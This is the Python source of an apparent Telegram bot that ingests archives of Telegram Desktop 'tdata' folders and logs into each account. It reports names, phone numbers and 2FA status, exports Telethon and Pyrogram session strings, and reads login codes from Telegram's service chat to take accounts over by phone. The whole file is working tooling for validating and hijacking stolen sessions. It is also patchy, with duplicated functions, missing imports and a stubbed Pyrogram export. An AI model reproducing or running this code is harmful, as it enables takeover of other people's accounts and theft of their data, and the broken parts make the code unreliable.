from pyromod.exceptions import ListenerTimeout
from config import Txt, Config
from .start import db

import os
import zipfile
import tempfile
import shutil
from pyrogram import Client, filters
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon import functions
from tdata_converter import convert_tdata   # external helper


API_ID = Config.API_ID
API_HASH = Config.API_HASH


async def login_w_tdata(tdata_path):
    """
    Convert Telegram Desktop tdata -> Telethon session and return account info.
    """
    session = convert_tdata(tdata_path, API_ID, API_HASH)
    client = TelegramClient(session, API_ID, API_HASH)

    try:
        await client.start()
        me = await client.get_me()

        # Collect info
        name = (me.first_name or "") + " " + (me.last_name or "")
        phone = me.phone or "Unknown"

        # Check if 2FA is enabled
        try:
            hint = await client(functions.account.GetPasswordRequest())
            twofa = "Y" if hint else "N"
        except Exception:
            twofa = "N"

        # Check spam/restricted (simple alive check)
        try:
            await client(functions.help.GetAppConfigRequest())
            spam = "N"
        except Exception:
            spam = "Y"

        return me.id, {
            "name": name.strip(),
            "phone": phone,
            "twofa": twofa,
            "spam": spam
        }

    finally:
        await client.disconnect()




import os, tempfile, zipfile, shutil
from pyrogram import Client, filters
from telethon import TelegramClient, functions

API_ID = 12345
API_HASH = "your_api_hash"



async def login_with_tdata(tdata_path):
    """
    Convert Telegram Desktop tdata -> Telethon session and return account info.
    """
    session_str = await convert_tdata(tdata_path, API_ID, API_HASH)

    async with TelegramClient(StringSession(session_str), API_ID, API_HASH) as client:
        me = await client.get_me()

        # Collect info
        name = (me.first_name or "") + " " + (me.last_name or "")
        phone = me.phone or "Unknown"

        # Check if 2FA is enabled
        try:
            hint = await client(functions.account.GetPasswordRequest())
            twofa = "Y" if hint else "N"
        except Exception:
            twofa = "N"

        # Check spam/restricted (simple alive check)
        try:
            await client(functions.help.GetAppConfigRequest())
            spam = "N"
        except Exception:
            spam = "Y"

        return me.id, {
            "name": name.strip(),
            "phone": phone,
            "twofa": twofa,
            "spam": spam
        }



import rarfile  # pip install rarfile

@Client.on_message(filters.document & filters.private)
async def handle_zip(client, message):
    try:
        if not message.document.file_name.endswith(".zip"):
            return await message.reply("❌ Please send a valid .zip containing accounts.")

        temp_dir = tempfile.mkdtemp()
        zip_path = await message.download(file_name=os.path.join(temp_dir, message.document.file_name))
        results = []

        # --- Step 1: Extract the ZIP
        try:
            with zipfile.ZipFile(zip_path, "r") as zip_ref:
                zip_ref.extractall(temp_dir)
            await message.reply(f"✅ Extraction complete at: {temp_dir}")
        except Exception as e:
            return await message.reply(f"❌ Failed to extract zip: {e}")

        # --- Step 2: List contents
        extracted = []
        for root, dirs, files in os.walk(temp_dir):
            for d in dirs:
                extracted.append(f"[DIR] {os.path.join(root, d)}")
            for f in files:
                extracted.append(f"[FILE] {os.path.join(root, f)} ({os.path.getsize(os.path.join(root, f))} B)")
        await message.reply("📂 Extracted contents:\n" + "\n".join(extracted))

        # --- Step 3: Look for tdata folder directly
        tdata_paths = []
        for root, dirs, files in os.walk(temp_dir):
            if "tdata" in dirs:
                tdata_paths.append(os.path.join(root, "tdata"))

            # --- Step 3b: Handle rar archives
            for f in files:
                if f.lower().endswith(".rar"):
                    rar_path = os.path.join(root, f)
                    try:
                        rar_extract_dir = os.path.join(root, "rar_extracted")
                        os.makedirs(rar_extract_dir, exist_ok=True)
                        with rarfile.RarFile(rar_path, "r") as rf:
                            rf.extractall(rar_extract_dir)

                        # check if tdata appeared
                        for r2, d2, f2 in os.walk(rar_extract_dir):
                            if "tdata" in d2:
                                tdata_paths.append(os.path.join(r2, "tdata"))
                    except Exception as e:
                        results.append(f"⚠️ Failed to extract rar {f}: {e}")

        if not tdata_paths:
            return await message.reply("⚠️ No tdata folders detected in this archive.")

        # --- Step 4: Process each tdata
        account_num = 1
        for tdata_path in tdata_paths:
            try:
                user_id, info = await login_with_tdata(tdata_path)
                results.append(
                    f"#{account_num}\n"
                    f"Account Name: {info.get('name','?')}\n"
                    f"Phone Number: {info.get('phone','?')}\n"
                    f"2FA enabled: {info.get('twofa','?')}\n"
                    f"Spam Mute: {info.get('spam','?')}\n"
                )
            except Exception as e:
                results.append(f"#{account_num}\nError logging in: {e}\n")
            account_num += 1

        await message.reply("📄 Accounts Report:\n\n" + "\n\n".join(results))

    except Exception as e:
        await message.reply(f"⚠️ Fatal error: {e}")
    finally:
        try:
            shutil.rmtree(temp_dir)
        except Exception:
            pass


                        

async def check_valid_session(tdata_bytes):
    """Check if a stored tdata is still valid."""
    temp_dir = tempfile.mkdtemp()
    tdata_path = os.path.join(temp_dir, "tdata.zip")

    with open(tdata_path, "wb") as f:
        f.write(base64.b64decode(tdata_bytes))

    # Extract
    extract_dir = os.path.join(temp_dir, "tdata")
    with zipfile.ZipFile(tdata_path, "r") as zip_ref:
        zip_ref.extractall(extract_dir)

    try:
        from tdata_converter import convert_tdata
        session = convert_tdata(extract_dir, API_ID, API_HASH)
        with TelegramClient(session, API_ID, API_HASH) as client:
            if client.is_user_authorized():
                me = client.get_me()
                return True, me, session
            else:
                return False, None, None
    except Exception:
        return False, None, None
    finally:
        shutil.rmtree(temp_dir)


@Client.on_message(filters.command("retrieve") & filters.private)
async def retrieve_account(client, message):
    if len(message.command) < 2:
        return await message.reply("⚠️ Usage: `/retrieve user_id`", quote=True)

    user_id = int(message.command[1])
    doc = await db.col.find_one({"_id": user_id})
    if not doc:
        return await message.reply("❌ Account not found in database.")

    # Check validity
    valid, me, session = await check_valid_session(doc["tdata"])
    status = "✅ Valid" if valid else "❌ Invalid"

    text = (
        f"📂 Account Info\n"
        f"User ID: {user_id}\n"
        f"Name: {doc['name']}\n"
        f"Phone: {doc['phone']}\n"
        f"2FA: {doc['twofa']}\n"
        f"Spam: {doc['spam']}\n"
        f"Status: {status}"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📄 Session Tele", callback_data=f"tele_{user_id}")],
        [InlineKeyboardButton("📄 Session Py", callback_data=f"py_{user_id}")],
        [InlineKeyboardButton("📱 By Phone", callback_data=f"phone_{user_id}")]
    ])

    await message.reply(text, reply_markup=keyboard)


@Client.on_callback_query(filters.regex(r"^(tele|py|phone)_(\d+)$"))
async def retrieve_options(client, callback_query):
    action, uid = callback_query.data.split("_")
    uid = int(uid)

    doc = await db.col.find_one({"_id": uid})
    if not doc:
        return await callback_query.message.edit("❌ Account not found.")

    valid, me, session = await check_valid_session(doc["tdata"])
    if not valid:
        return await callback_query.message.edit("❌ Session expired / invalid.")

    if action == "tele":
        string = session.save()
        txt = io.StringIO(string)
        txt.name = f"{uid}_tele_session.txt"
        await callback_query.message.reply_document(txt, caption="🔑 Telethon Session")
    elif action == "py":
        from pyrogram import Client as PyroClient
        from pyrogram.sessions import StringSession as PyroSession
        pyro_string = PyroSession().save()
        txt = io.StringIO(pyro_string)
        txt.name = f"{uid}_pyrogram_session.txt"
        await callback_query.message.reply_document(txt, caption="🔑 Pyrogram Session")
    elif action == "phone":
        phone = doc["phone"]
        await callback_query.message.reply(
            f"📱 Phone number: `{phone}`\n\nClick **Get Code** after sending code to this number.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📩 Get Code", callback_data=f"getcode_{uid}")]
            ])
        )



import re
import tempfile, zipfile, shutil, os, base64
from telethon import TelegramClient
from tdata_converter import convert_tdata


@Client.on_callback_query(filters.regex(r"^getcode_(\d+)$"))
async def get_code(client, callback_query):
    uid = int(callback_query.data.split("_")[1])
    doc = await db.col.find_one({"_id": uid})
    if not doc:
        return await callback_query.message.edit("❌ Account not found.")

    # Prepare tdata temp folder
    temp_dir = tempfile.mkdtemp()
    tdata_zip = os.path.join(temp_dir, "tdata.zip")
    with open(tdata_zip, "wb") as f:
        f.write(base64.b64decode(doc["tdata"]))

    extract_dir = os.path.join(temp_dir, "tdata")
    with zipfile.ZipFile(tdata_zip, "r") as zip_ref:
        zip_ref.extractall(extract_dir)

    try:
        # Convert tdata → Telethon session
        session = convert_tdata(extract_dir, API_ID, API_HASH)

        async with TelegramClient(session, API_ID, API_HASH) as tele:
            # Get last message from official Telegram (777000)
            msgs = await tele.get_messages(777000, limit=1)
            if not msgs:
                return await callback_query.answer("⚠️ No recent code messages found!", show_alert=True)

            text = msgs[0].message
            match = re.search(r"Login code[:\s]+(\d{5})", text)
            if match:
                code = match.group(1)
                await callback_query.answer(f"📩 Your login code is: {code}", show_alert=True)
            else:
                await callback_query.answer("⚠️ Couldn’t find a login code in the last message.", show_alert=True)

    except Exception as e:
        await callback_query.answer(f"❌ Error: {str(e)}", show_alert=True)
    finally:
        shutil.rmtree(temp_dir)
